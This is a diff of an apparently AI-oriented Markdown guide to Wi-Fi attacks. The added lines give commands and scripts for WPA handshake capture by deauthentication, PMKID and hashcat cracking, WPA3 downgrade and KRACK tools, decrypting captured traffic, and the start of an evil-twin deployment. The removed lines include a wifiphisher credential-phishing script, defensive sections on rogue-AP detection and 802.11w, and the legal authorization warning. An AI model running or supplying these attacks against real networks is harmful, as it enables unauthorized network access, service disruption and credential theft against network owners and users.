+# Management frames:
+wlan.fc.type == 0
+
+# Look for unencrypted data after WEP/WPA crack:
+data && !wlan_mgt
+```
+
+### Decrypt WPA/WPA2 Traffic in Wireshark
+```bash
+# After cracking WPA key, decrypt traffic in Wireshark
 # Edit → Preferences → Protocols → IEEE 802.11
-# Enable decryption, add key: wpa-psk or wpa-pwd
-# Format: <PSK_HEX> or password:SSID
+# Enable decryption: ✓ Enable decryption
+# Edit decryption keys → Add
+# Key type: wpa-pwd
+# Key: password:SSID
+# Example: password123:MyNetwork
+
+# Now data frames will be decrypted automatically
+# Filter for HTTP traffic:
+http
 ```
 
-### Extract Files from Decrypted Traffic
+## WPA3 and Advanced Attacks
 
+### Dragonblood WPA3 Downgrade
 ```bash
-# After decrypting in Wireshark
-# File → Export Objects → HTTP/SMB/TFTP
+# Install dragonslayer toolkit
+git clone https://github.com/vanhoefm/dragonslayer.git
+cd dragonslayer
 
-# Or use tshark
-tshark -r capture.cap -Y http -T fields -e http.file_data | xxd -r -p > extracted.bin
+# Downgrade attack (force WPA3 to WPA2)
+sudo ./dragonforce.py wlan0mon --target 00:11:22:33:44:55 --downgrade
+
+# Then capture WPA2 handshake normally
 ```
 
-## Defense and Detection
-
-### Detect Rogue APs
-
+### KRACK Attack Tools
 ```bash
-# Continuous monitoring with Kismet
-sudo kismet -c wlan0mon
+# Clone krackattacks
+git clone https://github.com/vanhoefm/krackattacks-scripts.git
+cd krackattacks-scripts
 
-# Look for:
-# - Duplicate SSIDs with different BSSIDs
-# - Weak signal APs with strong client association
-# - Known BSSIDs on wrong channels
+# Test network vulnerability
+sudo ./krack-test-client.py wlan0mon
 
-# Or use airodump with known BSSID whitelist
-sudo airodump-ng wlan0mon | grep -v "<KNOWN_BSSID1>\|<KNOWN_BSSID2>"
+# Disable hardware encryption (required for testing)
+sudo ./disable-hwcrypto.sh wlan0
+
+# Run attack
+sudo ./krack-all-zero-tk.py wlan0mon
 ```
 
-### Enable 802.11w (Management Frame Protection)
+## Scripting and Automation
 
+### Bash Script: Automated Handshake Capture
 ```bash
-# On hostapd-based AP, add to config:
-# ieee80211w=2  # Required
-# wpa_key_mgmt=WPA-PSK-SHA256
+#!/bin/bash
+# auto-handshake.sh - Automated WPA handshake capture
 
-# This prevents deauth attacks on supporting clients
+if [ "$EUID" -ne 0 ]; then
+  echo "Run as root"
+  exit 1
+fi
+
+INTERFACE="wlan0mon"
+BSSID="$1"
+CHANNEL="$2"
+OUTPUT="handshake-$(date +%Y%m%d-%H%M%S)"
+
+if [ -z "$BSSID" ] || [ -z "$CHANNEL" ]; then
+  echo "Usage: $0 <BSSID> <CHANNEL>"
+  exit 1
+fi
+
+echo "[*] Starting capture on $INTERFACE, targeting $BSSID on channel $CHANNEL"
+airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "$OUTPUT" "$INTERFACE" &
+AIRODUMP_PID=$!
+
+sleep 10
+
+echo "[*] Sending deauth packets..."
+aireplay-ng --deauth 10 -a "$BSSID" "$INTERFACE"
+
+sleep 5
+
+kill $AIRODUMP_PID
+
+if grep -q "WPA handshake" "${OUTPUT}-01.cap" 2>/dev/null; then
+  echo "[+] Handshake captured! File: ${OUTPUT}-01.cap"
+else
+  echo "[-] No handshake captured. Try again."
+fi
 ```
 
-### Wireless IDS with Kismet
+### Python Script: Parse airodump-ng CSV
+```python
+#!/usr/bin/env python3
+# parse_airodump.py - Parse airodump-ng CSV output
 
-```bash
-# Kismet alerts on:
-# - Deauthentication floods
-# - Beacon floods
-# - Rogue APs
-# - WEP usage
-# - Weak encryption
+import csv
+import sys
 
-# Check alerts
-kismet_client -h localhost -p 2501
+if len(sys.argv) < 2:
+    print(f"Usage: {sys.argv[0]} <airodump-csv-file>")
+    sys.exit(1)
 
-# Or review kismet logs
-tail -f ~/.kismet/logs/Kismet-*.kismet
+csv_file = sys.argv[1]
+
+with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
+    content = f.read()
+    # airodump CSV has two sections split by blank line
+    ap_section, client_section = content.split('\n\n', 1)
+
+# Parse AP section
+ap_reader = csv.DictReader(ap_section.splitlines())
+print("=" * 80)
+print("Access Points:")
+print("=" * 80)
+
+for row in ap_reader:
+    bssid = row.get('BSSID', '').strip()
+    pwr = row.get(' Power', '').strip()
+    channel = row.get(' channel', '').strip()
+    encryption = row.get(' Privacy', '').strip()
+    essid = row.get(' ESSID', '').strip()
+    
+    if bssid and bssid != 'BSSID':  # Skip header
+        print(f"BSSID: {bssid:20} PWR: {pwr:5} CH: {channel:3} ENC: {encryption:10} ESSID: {essid}")
+
+# Parse client section
+print("\n" + "=" * 80)
+print("Clients:")
+print("=" * 80)
+
+client_reader = csv.DictReader(client_section.splitlines())
+for row in client_reader:
+    station = row.get('Station MAC', '').strip()
+    bssid = row.get(' BSSID', '').strip()
+    probes = row.get(' Probed ESSIDs', '').strip()
+    
+    if station and station != 'Station MAC':
+        print(f"Client: {station:20} Connected to: {bssid:20} Probes: {probes}")
+```
+
+### Python Script: Automated PMKID Cracking
+```python
+#!/usr/bin/env python3
+# pmkid_crack.py - Automated PMKID capture and crack
+
+import subprocess
+import time
+import sys
+import os
+
+INTERFACE = "wlan0mon"
+CAPTURE_TIME = 120  # seconds
+WORDLIST = "/usr/share/wordlists/rockyou.txt"
+
+def run_cmd(cmd):
+    """Execute shell command"""
+    print(f"[*] Running: {cmd}")
+    subprocess.run(cmd, shell=True, check=True)
+
+def capture_pmkid(output_file):
+    """Capture PMKID with hcxdumptool"""
+    print(f"[*] Capturing PMKID for {CAPTURE_TIME} seconds...")
+    cmd = f"timeout {CAPTURE_TIME} hcxdumptool -i {INTERFACE} -o {output_file} --enable_status=15"
+    
+    try:
+        subprocess.run(cmd, shell=True)
+    except subprocess.CalledProcessError:
+        pass  # timeout exits with non-zero
+
+def convert_to_hashcat(pcapng_file, hash_file):
+    """Convert pcapng to hashcat format"""
+    print(f"[*] Converting {pcapng_file} to hashcat format...")
+    cmd = f"hcxpcapngtool -o {hash_file} {pcapng_file}"
+    run_cmd(cmd)
+
+def crack_pmkid(hash_file):
+    """Crack PMKID with hashcat"""
+    print(f"[*] Cracking PMKID with hashcat...")
+    cmd = f"hashcat -m 22000 -a 0 {hash_file} {WORDLIST} --quiet"
+    
+    try:
+        subprocess.run(cmd, shell=True, check=True)
+        
+        # Show results
+        print("\n[+] Attempting to display cracked passwords:")
+        show_cmd = f"hashcat -m 22000 {hash_file} --show"
+        subprocess.run(show_cmd, shell=True)
+        
+    except subprocess.CalledProcessError:
+        print("[-] No passwords cracked.")
+
+def main():
+    if os.geteuid() != 0:
+        print("[-] Must run as root")
+        sys.exit(1)
+    
+    timestamp = time.strftime("%Y%m%d-%H%M%S")
+    pcapng_file = f"pmkid-{timestamp}.pcapng"
+    hash_file = f"pmkid-{timestamp}.hc22000"
+    
+    try:
+        capture_pmkid(pcapng_file)
+        
+        if not os.path.exists(pcapng_file):
+            print("[-] No capture file created")
+            sys.exit(1)
+        
+        convert_to_hashcat(pcapng_file, hash_file)
+        
+        if not os.path.exists(hash_file):
+            print("[-] No PMKID hashes extracted")
+            sys.exit(1)
+        
+        crack_pmkid(hash_file)
+        
+    except KeyboardInterrupt:
+        print("\n[!] Interrupted by user")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()
 ```
 
 ## Common Patterns
 
-### Full WPA2 Capture and Crack Workflow
-
+### Full WPA2 Attack Workflow
 ```bash
-#!/bin/bash
-TARGET_BSSID="00:11:22:33:44:55"
-TARGET_CHANNEL="6"
-TARGET_ESSID="TargetNetwork"
-WORDLIST="/usr/share/wordlists/rockyou.txt"
-
 # 1. Enable monitor mode
 sudo airmon-ng start wlan0
-sleep 2
 
-# 2. Start capture
-sudo airodump-ng --bssid $TARGET_BSSID -c $TARGET_CHANNEL -w capture wlan0mon &
-AIRODUMP_PID=$!
+# 2. Discover targets
+sudo airodump-ng wlan0mon
 
-# 3. Wait for client, then deauth
-echo "Waiting 10 seconds for clients..."
-sleep 10
-sudo aireplay-ng --deauth 10 -a $TARGET_BSSID wlan0mon
+# 3. Focus on target and capture handshake
+sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon
 
-# 4. Wait for handshake
-echo "Capturing handshake (30 seconds)..."
-sleep 30
-sudo kill $AIRODUMP_PID
+# 4. In another terminal, deauth client
+sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
 
-# 5. Verify handshake
-if sudo aircrack-ng capture-01.cap | grep -q "1 handshake"; then
-    echo "Handshake captured!"
-    
-    # 6. Crack
-    sudo aircrack-ng -w $WORDLIST -b $TARGET_BSSID capture-01.cap
-else
-    echo "No handshake captured. Retry."
-fi
+# 5. Stop capture when handshake appears
+# Ctrl+C in airodump-ng
 
-# 7. Cleanup
+# 6. Convert to hashcat format
+hcxpcapngtool -o hash.hc22000 capture-01.cap
+
+# 7. Crack with hashcat
+hashcat -m 22000 -a 0 hash.hc22000 /usr/share/wordlists/rockyou.txt
+
+# 8. Disable monitor mode
 sudo airmon-ng stop wlan0mon
 ```
 
-### Automated Evil Twin for Credential Harvesting
-
+### Complete Evil Twin Deployment
 ```bash
-#!/bin/bash
-TARGET_SSID="CorporateWiFi"
-TARGET_BSSID="AA:BB:CC:DD:EE:FF"
-CHANNEL="6"
+# 1. Deauth legitimate AP clients
+sudo aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan0
 
-# Kill interfering processes
-sudo airmon-ng check kill
-
-# Enable monitor mode
-sudo airmon-ng start wlan0
-
-# Deauth legitimate AP to push clients to evil twin
-sudo aireplay-ng --deauth 0 -a $TARGET_BSSID wlan0mon &
-DEAUTH_PID=$!
-
-# Start evil twin with credential phishing
-sudo wifiphisher -aI wlan0mon -e "$TARGET_SSID" -p wifi_connect -nE
-
-# Credentials saved to wifiphisher.log
-# Ctrl+C to stop, then:
-kill $DEAUTH_PID
-sudo airmon-ng stop wlan0mon
-```
-
-## Troubleshooting
-
-### Monitor Mode Won't Start
-
-```bash
-# Check for conflicts
-sudo airmon-ng check
-sudo airmon-ng check kill
-
-# Manually kill problematic processes
-sudo killall NetworkManager wpa_supplicant dhclient
-
-# Restart network services after testing
-sudo systemctl restart NetworkManager
-```
-
-### Injection Test Fails
-
-```bash
-# Verify chipset
-lsusb | grep -i wireless
-# Should show Atheros, Ralink, or other supported chipset
-
-# Update drivers
-sudo apt update
-sudo apt install firmware-atheros firmware-ralink
-
-# Test different channels
-for ch in 1 6 11; do
-    sudo iwconfig wlan0mon channel $ch
-    sudo aireplay-ng --test wlan0mon
-done
-```
-
-### No Handshake Captured
-
-```bash
-# Ensure client is connected (STATION shows in airodump)
-# If no clients, wait or use PMKID attack instead
-
-# Increase deauth packets
-sudo aireplay-ng --deauth 50 -a <AP_BSSID> wlan0mon
-
-# Target specific client
-sudo aireplay-ng --deauth 20 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon
-
-# Check capture for handshake manually
-sudo aircrack-ng capture-01.cap
-# Look for "1 handshake" message
-```
-
-### WPA Cracking is Slow
-
-```bash
-# Use GPU with hashcat instead of CPU aircrack
-hashcat -m 22000 -a 0 -w 3 capture.22000 rockyou.txt --force
-
-# -w 3: High workload (uses more GPU)
-# --force: Ignore warnings on non-optimal hardware
-
-# Check hashcat speed
-hashcat -m 22000 -b
-
-# Optimize wordlist (remove duplicates)
-sort -u rockyou.txt -o rockyou_unique.txt
-```
-
-### Rogue AP Not Attracting Clients
-
-```bash
-# Ensure stronger signal than legitimate AP
-# - Move closer to target clients
-# - Use external antenna
-# - Increase TX power (within legal limits)
-sudo iw wlan0mon set txpower fixed 2000  # 20 dBm
-
-# Spoof legitimate BSSID exactly
-sudo macchanger -m <TARGET_BSSID> wlan0mon
-
-# Continuously deauth legitimate AP
-sudo aireplay-ng --deauth 0 -a <LEGIT_BSSID> wlan0mon &
-
-# Use same channel and SSID
-```
-
-### Airodump Shows No Networks
-
-```bash
-# Check interface is in monitor mode
-sudo iwconfig wlan0mon
-# Should show Mode:Monitor
-
-# Scan all bands
-sudo airodump-ng --band abg wlan0mon
-
-# Check regulatory domain allows scanning
-sudo iw reg get
-sudo iw reg set US  # or your country code
-
-# Verify antenna is connected properly
-```
-
-## Environment Variables
-
-```bash
-# Set interface names
-export WLAN_IFACE="wlan0"
-export WLAN_MON="wlan0mon"
-
-# Default wordlists
-export WORDLIST_SMALL="/usr/share/wordlists/fasttrack.txt"
-export WORDLIST_LARGE="/usr/share/wordlists/rockyou.txt"
-
-# Capture directory
-export CAPTURE_DIR="$HOME/wifi_captures"
-mkdir -p $CAPTURE_DIR
-
-# Use in scripts
-sudo airodump-ng -w $CAPTURE_DIR/capture $WLAN_MON
-```
-
-## Best Practices
-
-1. **Always get written authorization** before testing wireless networks
-2. **Isolate your lab** - use low TX power and RF-shielded environments
-3. **Verify chipset** before purchasing adapters - not all WiFi cards support injection
-4. **Take snapshots** of VMs before each attack phase for easy rollback
-5. **Document findings** - keep logs of successful attacks for reporting
-6. **Test defenses** - after each attack, configure and test mitigations (802.11w, WPA3, strong PSKs)
-7. **Use bare metal** for timing-sensitive attacks (WEP Chop-Chop, fragmentation)
-8. **Monitor spectrum** - use Kismet to understand the RF environment before attacking
-9. **Rotate attack vectors** - if one method fails (handshake), try another (PMKID, WPS)
-10. **Clean up** - stop monitor mode and restart NetworkManager when done
-
-## Legal Warning
-
-All techniques in this skill are for **authorized testing only**. Wireless attacks against networks you don't own or lack explicit written permission to test are illegal under:
-
-- Computer Fraud and Abuse Act (CFAA) - USA
-- Computer Misuse Act - UK
-- Similar laws globally
-
-Practice only on:
-- Your own isolated lab equipment
-- CTF/training ranges
-- Client networks with signed authorization
-
-Deauthentication, jamming, and rogue APs disrupt service and can affect neighboring networks - use minimum necessary power and duration.
+# 2. Start evil twin (cloned SSID)
